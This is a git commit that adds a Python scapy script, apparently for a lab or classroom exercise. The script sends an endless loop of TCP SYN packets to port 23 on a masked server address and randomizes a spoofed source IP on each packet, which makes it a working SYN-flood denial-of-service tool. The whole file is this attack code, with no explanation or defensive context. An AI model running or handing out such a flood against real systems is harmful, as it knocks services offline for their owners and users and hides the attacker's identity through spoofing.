16a2e79fe992a85a807a427ab069ade5238c1fb5
AusYecklp <73651864+AUSyecklp@users.noreply.github.com>
2023-12-04 14:46:03 +0800

    Update scapy.py

--- scapy.py
+++ scapy.py
@@ -1,1 +1,12 @@
+#!/usr/bin/python2
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbits
 
+a = IP(dst="***.***.***.***")	# server IP
+b = TCP(sport=1551, dport=23, seq=1551, flags='S')
+pkt = a/b
+
+while True:
+    pkt['IP'].src = str(IPv4Address(getrandbits(32)))
+    send(pkt, verbose = 0)
